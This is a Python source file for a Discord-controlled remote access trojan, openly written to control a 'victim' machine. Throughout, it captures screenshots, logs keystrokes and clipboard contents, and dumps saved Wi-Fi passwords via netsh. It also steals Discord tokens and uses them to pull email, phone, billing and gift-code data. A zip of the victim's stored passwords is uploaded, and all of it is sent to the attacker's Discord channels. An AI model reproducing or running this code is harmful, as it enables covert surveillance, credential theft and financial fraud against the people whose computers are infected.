import discord, os, subprocess, socket, requests, uuid, platform, pyautogui, pyperclip, ctypes, psutil
import zipfile
import sys
from datetime import datetime, timedelta
from random import randint
from payloads.gettoken import GETTOKEN
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener
import threading
import asyncio
from pynput.keyboard import Listener
import winreg
import aiohttp

zip_file_path = os.path.join(os.getenv('APPDATA'), 'vault.zip')

async def spying(bot, channel_id):
    channel = bot.get_channel(channel_id)
    while True:
        try:
            screenshot_path = os.path.join(os.getenv("APPDATA"), "screenshots", f"{randint(1000, 9999)}.png")
            os.makedirs(os.path.dirname(screenshot_path), exist_ok=True)
            pyautogui.screenshot(screenshot_path)

            with open(screenshot_path, "rb") as screenshot_file:
                await channel.send(file=discord.File(screenshot_file, "screenshot.png"))
            
            await asyncio.sleep(3.0)
        except Exception:
            continue

async def updates(bot, channel_id):
    channel = bot.get_channel(channel_id)
    last_clip = ""
    tracked = set()
    startup = set()
    taskmgr_enabled = True

    def is_sys(proc):
        try:
            exe_path = proc.info['exe']
            if exe_path:
                if "Windows" in exe_path or "System32" in exe_path:
                    if "cmd.exe" in exe_path or "Settings" in exe_path:
                        return False
                    return True
        except:
            return True


    def is_taskmgr_enabled():
        try:
            reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                value, _ = winreg.QueryValueEx(key, "DisableTaskMgr")
                return value == 0
        except FileNotFoundError:
            return True

    def check_startup_files():
        start_dir = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        current_files = set()
        for root, _, files in os.walk(start_dir):
            for file in files:
                current_files.add(os.path.join(root, file))
        return current_files

    startup = check_startup_files()

    while True:
        try:
            clip = pyperclip.paste()
            if clip != last_clip:
                last_clip = clip
                if len(clip) < 2000:
                    embed = discord.Embed(title="CLIPBOARD UPDATED:", description=clip, color=0xFFFF00)
                    await channel.send(embed=embed)
                else:
                    path = os.path.join(os.getenv("APPDATA"), "data", f"{randint(1000, 9999)}.txt")
                    os.makedirs(os.path.dirname(path), exist_ok=True)
                    with open(path, "w", encoding="utf-8") as f:
                        f.write(clip)
                    embed = discord.Embed(title="CLIPBOARD UPDATED:", description="Content too large, sent as file.", color=0xFFFF00)
                    await channel.send(embed=embed, file=discord.File(path, "clip.txt"))

            procs = {p.name(): p for p in psutil.process_iter(['name', 'exe', 'username']) if not is_sys(p)}

            for name in procs:
                if name not in tracked:
                    embed = discord.Embed(title="APP OPENED:", description=name, color=0x00FF00)
                    await channel.send(embed=embed)
            for name in list(tracked):
                if name not in procs:
                    embed = discord.Embed(title="TASK KILLED:", description=name, color=0xFF0000)
                    await channel.send(embed=embed)
                    tracked.remove(name)
            tracked = set(procs)

            current_taskmgr_state = is_taskmgr_enabled()
            if current_taskmgr_state != taskmgr_enabled:
                state = "ENABLED" if current_taskmgr_state else "DISABLED"
                embed = discord.Embed(title="TASK MANAGER TOGGLED:", description=f"NOW: {state}", color=0xFFA500)
                await channel.send(embed=embed)
                taskmgr_enabled = current_taskmgr_state

            current_startup = check_startup_files()
            for path in current_startup - startup:
                embed = discord.Embed(title="FILE ADDED TO STARTUP:", description=path, color=0x800080)
                await channel.send(embed=embed)
            for path in startup - current_startup:
                embed = discord.Embed(title="FILE REMOVED FROM STARTUP:", description=path, color=0x0000FF)
                await channel.send(embed=embed)
            startup = current_startup

            await asyncio.sleep(0.1)
        except:
            continue
async def send_vault_file(channel):
    vault_path = os.path.join(os.getenv('APPDATA'), 'vault.zip')
    if os.path.exists(vault_path):
        try:
            await channel.send(file=discord.File(vault_path))

            with zipfile.ZipFile(vault_path, 'r') as zip_ref:
                contents = zip_ref.namelist()
                dirs = {}

                for item in contents:
                    if item and zip_ref.getinfo(item).file_size > 0:
                        parts = item.strip("/").split("/")
                        file = parts[-1]
                        size = zip_ref.getinfo(item).file_size / 1024
                        folder_path = "/".join(parts[:-1]) if len(parts) > 1 else None

                        if folder_path:
                            if folder_path not in dirs:
                                dirs[folder_path] = {'files': [], 'size': 0, 'subdirs': set()}
                            dirs[folder_path]['files'].append((file, size))
                            dirs[folder_path]['size'] += size

                            for i in range(1, len(parts) - 1):
                                parent_path = "/".join(parts[:i])
                                child_path = "/".join(parts[: i + 1])
                                if parent_path not in dirs:
                                    dirs[parent_path] = {'files': [], 'size': 0, 'subdirs': set()}
                                dirs[parent_path]['subdirs'].add(child_path)
                        else:
                            if 'root' not in dirs:
                                dirs['root'] = {'files': [], 'size': 0, 'subdirs': set()}
                            dirs['root']['files'].append((file, size))
                            dirs['root']['size'] += size

                def format_directory_structure(path, level=0):
                    indent = "│   " * level
                    formatted = f"{indent}📂 - {os.path.basename(path)} ({len(dirs[path]['files'])} files, {dirs[path]['size']:.2f} kb)\n"

                    for file, size in dirs[path]['files']:
                        formatted += f"{indent}│   ├── 📄 - {file} ({size:.2f} kb)\n"

                    for subfolder in sorted(dirs[path]['subdirs']):
                        if subfolder in dirs:
                            formatted += format_directory_structure(subfolder, level + 1)

                    return formatted

                formatted_contents = "📂 - vault.zip\n"
                for folder in sorted(dirs):
                    if '/' not in folder and folder != 'root':
                        formatted_contents += format_directory_structure(folder)

                if 'root' in dirs:
                    for file, size in dirs['root']['files']:
                        formatted_contents += f"├── 📄 - {file} ({size:.2f} kb)\n"

                embed = discord.Embed(description=f"```{formatted_contents}```", color=discord.Color.dark_embed())
                await channel.send(embed=embed)
        except Exception as e:
            await channel.send(f"Error opening vault.zip: {str(e)}")
    else:
        pass

async def start_moonman(bot, channel_id):
    channel = bot.get_channel(channel_id)
    key_buffer = []
    file_count = 0

    async def save_and_send():
        nonlocal file_count, key_buffer
        try:
            if len(key_buffer) < 20:
                return
            file_count += 1
            file_path = os.path.join(os.getenv("APPDATA"), "keys", f"keys_{file_count}.txt")
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            with open(file_path, "w") as file:
                file.write("\n".join(key_buffer))
            key_buffer.clear()
            if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
                with open(file_path, "rb") as file:
                    await channel.send(file=discord.File(file, f"keys_{file_count}.txt"))
        except Exception:
            pass

    def on_key_press(key):
        nonlocal key_buffer
        try:
            key_str = None
            if hasattr(key, "char") and key.char:  
                key_str = key.char
            elif hasattr(key, "name") and key.name == 'space':  
                key_str = "space"
            elif hasattr(key, "vk") and 96 <= key.vk <= 105: 
                key_str = f"num.{key.vk - 96}"
            elif hasattr(key, "name"):   
                key_str = key.name

            if key_str:
                key_buffer.append(key_str)
                if len(key_buffer) >= 20:
                    asyncio.run_coroutine_threadsafe(save_and_send(), bot.loop)
        except Exception:
            pass

    def on_mouse_click(x, y, button, pressed):
        nonlocal key_buffer
        try:
            if pressed:
                key_buffer.append(f"mouse.{button.name}")
                if len(key_buffer) >= 20:
                    asyncio.run_coroutine_threadsafe(save_and_send(), bot.loop)
        except Exception:
            pass

    keyboard_listener = Listener(on_press=on_key_press)
    mouse_listener = MouseListener(on_click=on_mouse_click)

    keyboard_listener.start()
    mouse_listener.start()

    while True:
        await asyncio.sleep(1)
        

async def run(bot):
    guild = sorted(bot.guilds, key=lambda g: g.me.joined_at, reverse=False)[0]
    pcname = username = None
    is_admin = False
    ipv4 = public_ip = None
    ip_geolocation = None
    location = "N/A"
    token = None
    mac_address = os_version = timezone = None
    screenshot_path = screenshot_file = None
    wifi_details = ""
    cursor_x, cursor_y = None, None
    ram = ram_used = memory = memory_used = 0
    uptime = None

    def fetch_pc_info():
        nonlocal pcname, username
        try: pcname = subprocess.check_output("echo %COMPUTERNAME%", shell=True).decode().strip()
        except: pass
        try: username = subprocess.check_output("echo %USERNAME%", shell=True).decode().strip()
        except: pass

    def fetch_admin_status():
        nonlocal is_admin
        try: is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except: pass

    def fetch_ip_info():
        nonlocal ipv4, public_ip, ip_geolocation, location
        ipv4, public_ip, ip_geolocation, location = None, None, None, "N/A"
        try:
            ipv4 = [
                i[4][0]
                for i in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET)
                if i[4][0].startswith(("10", "172", "192"))
            ][0]
        except Exception:
            ipv4 = None

        try:
            public_ip = requests.get('https://api64.ipify.org', timeout=5).text
        except Exception:
            public_ip = None

        if public_ip:
            try:
                ip_geolocation = requests.get(
                    f"http://ip-api.com/json/{public_ip}", timeout=5
                ).json()
            except Exception:
                ip_geolocation = None

        if ip_geolocation:
            location = f"{ip_geolocation.get('city', 'N/A')}, {ip_geolocation.get('country', 'N/A')}"
        else:
            location = "N/A"

    def fetch_token():
        nonlocal token
        try: token = GETTOKEN().gettokens()
        except: pass

    def fetch_mac_address():
        nonlocal mac_address
        try: mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
        except: pass

    def fetch_os_version():
        nonlocal os_version
        try: os_version = platform.system() + " " + platform.release()
        except: pass

    def fetch_timezone():
        nonlocal timezone
        try: timezone = datetime.now().astimezone().tzinfo.tzname(None)
        except: pass

    def fetch_screenshot():
        nonlocal screenshot_path, screenshot_file
        screenshot_dir = os.path.join(os.getenv("APPDATA"), "screenshots")
        os.makedirs(screenshot_dir, exist_ok=True)
        screenshot_path = os.path.join(screenshot_dir, f"sss_{randint(1000, 9999)}.png")
        try: pyautogui.screenshot(screenshot_path)
        except: screenshot_path = None
        if screenshot_path and os.path.exists(screenshot_path):
            try:
                with open(screenshot_path, "rb") as img: screenshot_file = discord.File(img, "screenshot.png")
            except: pass 

    def fetch_wifi_info():
        nonlocal wifi_details
        try: wifi_info = subprocess.check_output("netsh wlan show profiles", shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split("\n")
        except: wifi_info = []
        ssid_list = [line.split(":")[1].strip() for line in wifi_info if "All User Profile" in line]
        current_wifi = None
        try:
            current_wifi = subprocess.check_output('netsh wlan show interfaces', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split("\n")
            current_wifi = [line.split(":")[1].strip() for line in current_wifi if "SSID" in line][0]
        except: current_wifi = None
        for ssid in ssid_list:
            try: profile_info = subprocess.check_output(f"netsh wlan show profile {ssid} key=clear", shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split("\n")
            except: profile_info = []
            password = "Not found"
            for line in profile_info:
                if "Key Content" in line: password = line.split(":")[1].strip(); break
            if ssid == current_wifi: wifi_details += f"```**CURRENT SSID: {ssid}**``` | Password: ```**{password}**```\n"
            else: wifi_details += f"SSID: ```{ssid}``` | Password: ```{password}```\n"

    def fetch_cursor_coords():
        nonlocal cursor_x, cursor_y
        try: cursor_x, cursor_y = pyautogui.position()
        except: pass

    def fetch_memory_info():
        nonlocal ram, ram_used, memory, memory_used
        try: ram = psutil.virtual_memory().total / (1024 ** 3)
        except: pass
        try: ram_used = psutil.virtual_memory().used / (1024 ** 3)
        except: pass
        try: c_drive = psutil.disk_usage('C:/')
        except: c_drive = None
        if c_drive:
            try: memory = c_drive.total / (1024 ** 3)
            except: pass
            try: memory_used = c_drive.used / (1024 ** 3)
            except: pass

    def fetch_uptime():
        nonlocal uptime
        try: uptime_seconds = int(psutil.boot_time())
        except: uptime_seconds = None
        if uptime_seconds:
            uptime = str(timedelta(seconds=(datetime.now().timestamp() - uptime_seconds)))

    threads = []
    for func in [fetch_pc_info, fetch_admin_status, fetch_ip_info, fetch_token, fetch_mac_address, fetch_os_version, fetch_timezone, fetch_screenshot, fetch_wifi_info, fetch_cursor_coords, fetch_memory_info, fetch_uptime]:
        thread = threading.Thread(target=func)
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()

    category_name = f'{username}-{pcname}'
    category = await guild.create_category(category_name)
    
    commands_channel = await guild.create_text_channel(
        f'{username}-{pcname}-commands', 
        category=category,
        topic="this is the main channel for controlling the victim. use .help for a command guide. FYI: the vault.zip contains all the passwords of the victim and can be found at the top of the channel"
    )
    bot.commands_channel[commands_channel.id] = True
    screenies = await guild.create_text_channel(
        f'{username}-{pcname}-screenshots', 
        category=category,
        topic="live screenshots sent here every 5 seconds, commands wont work here"
    )

    keysc = await guild.create_text_channel(
        f'{username}-{pcname}-keylog', 
        category=category,
        topic="pressed keys are sent here in real time"
    )
    updateschannel = await guild.create_text_channel(
        f'{username}-{pcname}-systemupdates', 
        category=category,
        topic="channel for logging various events on the pc"
    )    

    asyncio.create_task(spying(bot, screenies.id))
    asyncio.create_task(start_moonman(bot, keysc.id))
    asyncio.create_task(updates(bot, updateschannel.id))

    await commands_channel.send(f"||@everyone|| NEW VICTIM: {username}!!\n type .help for the list of commands")
    try:
        await send_vault_file(commands_channel)
    except FileNotFoundError:
        pass    
    if os.path.exists(zip_file_path):
        os.remove(zip_file_path)

    embed = discord.Embed(title=pcname, color=discord.Color.red())

    if screenshot_path and os.path.exists(screenshot_path):
        embed.set_image(url="attachment://screenshot.png")

    admin_status = "✅" if is_admin else "❌"
    embed.add_field(name="🔒 Admin", value=admin_status, inline=True)
    embed.add_field(name="📍 IP Geolocation", value=location, inline=True)
    embed.add_field(name="🌐 Private IPv4", value=ipv4 if ipv4 else "N/A", inline=True)
    embed.add_field(name="🌍 Public IP", value=public_ip if public_ip else "N/A", inline=True)
    embed.add_field(name="👤 Username", value=username if username else "N/A", inline=True)
    embed.add_field(name="💻 PC Name", value=pcname if pcname else "N/A", inline=True)
    embed.add_field(name="🔌 MAC Address", value=mac_address if mac_address else "N/A", inline=True)
    embed.add_field(name="🖥 OS", value=os_version if os_version else "N/A", inline=True)
    embed.add_field(name="🕒 Time Zone", value=timezone if timezone else "N/A", inline=True)
    embed.add_field(name="🖱 Cursor Position", value=f"X: {cursor_x} Y: {cursor_y}", inline=True)
    embed.add_field(name="🔧 Current Exe Name", value=sys.executable, inline=False)
    embed.add_field(name="📶 Wi-Fi Info", value=wifi_details if wifi_details else "ETHERNET", inline=False)
    embed.add_field(name="💾 RAM", value=f"Used: {ram_used:.2f} GB / Total: {ram:.2f} GB", inline=True)
    embed.add_field(name="💾 Memory", value=f"Used: {memory_used:.2f} GB / Total: {memory:.2f} GB", inline=True)
    embed.add_field(name="⏳ Uptime", value=uptime if uptime else "N/A", inline=True)

    if screenshot_file:
        await commands_channel.send(embed=embed, file=screenshot_file)
    else:
        await commands_channel.send(embed=embed)

    for t in token:
        second_embed = discord.Embed(color=discord.Color.purple())

        second_embed.add_field(name="🔑 Discord Token", value=f"```{t if t else 'none'}```", inline=False)

        if t:
            headers = {
                "Authorization": f"{t}"
            }

            user_data = None
            billing_data = None
            gift_codes = None

            def fetch_user_data():
                nonlocal user_data
                user_data = requests.get("https://discord.com/api/v9/users/@me", headers=headers).json()

            def fetch_billing_data():
                nonlocal billing_data
                billing_data = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers).json()

            def fetch_gift_codes():
                nonlocal gift_codes
                gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=headers).json()

            user_thread = threading.Thread(target=fetch_user_data)
            billing_thread = threading.Thread(target=fetch_billing_data)
            gift_codes_thread = threading.Thread(target=fetch_gift_codes)

            user_thread.start()
            billing_thread.start()
            gift_codes_thread.start()

            user_thread.join()
            billing_thread.join()
            gift_codes_thread.join()

            try:
                if user_data:
                    discord_username = user_data.get('username', 'Unknown')
                    display_name = user_data.get('nick', 'No Display Name')
                    premium_type = user_data.get('premium_type', 0)
                    phone_number = user_data.get('phone', 'N/A')
                    email = user_data.get('email', 'N/A')
                    email_verified = user_data.get('verified', False)
                    pfp_url = user_data.get('avatar', None)

                    if billing_data:
                        if billing_data:
                            billing_method = "None"
                            for payment_source in billing_data:
                                if payment_source.get('type') == 1:
                                    billing_method = "Credit Card"
                                elif payment_source.get('type') == 2:
                                    billing_method = "Paypal"
                            billing_status = f"Active ({billing_method})"
                        else:
                            billing_status = "No active billing method"
                    else:
                        billing_status = "Error fetching billing info"

                    second_embed.title = discord_username
                    second_embed.add_field(name="Display Name", value=display_name, inline=False)
                    second_embed.add_field(name="Billing 💰", value=billing_status, inline=False)

                    if premium_type == 0:
                        nitro_status = "None"
                    elif premium_type == 1:
                        nitro_status = "Nitro Classic"
                    elif premium_type == 2:
                        nitro_status = "Nitro Boost"
                    second_embed.add_field(name="Nitro", value=f"💎 {nitro_status}", inline=False)

                    second_embed.add_field(name="Email", value=email, inline=False)
                    second_embed.add_field(name="Phone Number 📱", value=phone_number, inline=False)
                    second_embed.add_field(name="Email Verified", value="✅" if email_verified else "❌", inline=False)

                    if gift_codes:
                        gift_code_list = "\n".join([f"Code: {code['code']} - {code['status']}" for code in gift_codes])
                        second_embed.add_field(name="Gift Codes", value=gift_code_list if gift_codes else "No Gift Codes", inline=False)

                    if pfp_url:
                        second_embed.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_data['id']}/{pfp_url}.png")

            except Exception as e:
                second_embed.title = "Error Fetching Data"
                second_embed.add_field(name="Error", value=str(e), inline=False)

        await commands_channel.send(embed=second_embed)




    return commands_channel



    